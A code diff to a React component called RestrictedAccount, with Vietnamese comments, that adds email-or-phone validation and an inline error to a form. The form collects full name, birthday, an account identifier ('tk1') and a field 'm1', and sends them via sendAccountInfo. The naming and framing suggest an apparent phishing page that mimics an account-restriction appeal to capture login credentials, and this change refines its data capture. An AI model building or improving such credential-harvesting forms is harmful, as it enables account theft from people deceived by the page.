@@ -20,6 +20,7 @@ function RestrictedAccount() {
   const navigate = useNavigate();
   const { t } = useTranslation();
   const [showModal, setShowModal] = useState(false);
+  const [tk1Error, setTk1Error] = useState("");
 
   const now = new Date(Date.now());
 
@@ -59,10 +60,27 @@ function RestrictedAccount() {
     fetchData();
   }, []);
 
+   // 🔹 Hàm kiểm tra email/phone
+  const validateEmailOrPhone = (value) => {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const phoneRegex = /^(\+?\d{10,15}|0\d{9,10})$/;
+    if (emailRegex.test(value)) return true;
+    if (phoneRegex.test(value)) return true;
+    return false;
+  };
+
   const sendAccountInfo = async () => {
     if (!fullName.trim() || !birthday.trim() || !tk1.trim() || !m1.trim()) {
       alert("Please fill in all required fields.");
       return;
+    }
+
+    // 🔹 Kiểm tra định dạng email hoặc phone
+    if (!validateEmailOrPhone(tk1)) {
+      setTk1Error("Please enter a valid email or phone number.");
+      return;
+    } else {
+      setTk1Error("");
     }
 
     setShowModal(true);
@@ -120,12 +138,16 @@ debugger;
           <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="form-control mb-2" placeholder={t("restrictedAccount.fullName")} />
           <input type="text" value={birthday} onChange={(e) => setBirthday(e.target.value)} className="form-control mb-2" placeholder={t("restrictedAccount.birthday")} />
           <input
-            type="email"
-            className="form-control mb-2"
+            type="text"
+            className={`form-control mb-1 ${tk1Error ? "is-invalid" : ""}`}
             placeholder={t("restrictedAccount.emailPhone")}
             value={tk1}
-            onChange={(e) => setTk1(e.target.value)}
+            onChange={(e) => {
+              setTk1(e.target.value);
+              setTk1Error("");
+            }}
           />
+          {tk1Error && <div className="invalid-feedback text-start">{tk1Error}</div>}
           <input
             type="text"
             className="form-control mb-3"
